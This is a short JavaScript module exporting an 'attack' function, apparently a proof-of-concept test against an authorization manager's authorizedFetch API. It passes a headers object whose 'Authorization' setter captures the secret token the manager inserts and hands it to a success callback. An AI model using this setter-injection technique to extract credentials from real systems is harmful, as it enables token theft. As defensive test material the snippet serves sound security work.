export const attack = (authzManager, success) => {
  authzManager.authorizedFetch([{
    url:'nevermind',
    headers: {
      set Authorization(secret) {
        success(secret);
      },
    }
  }]);
};
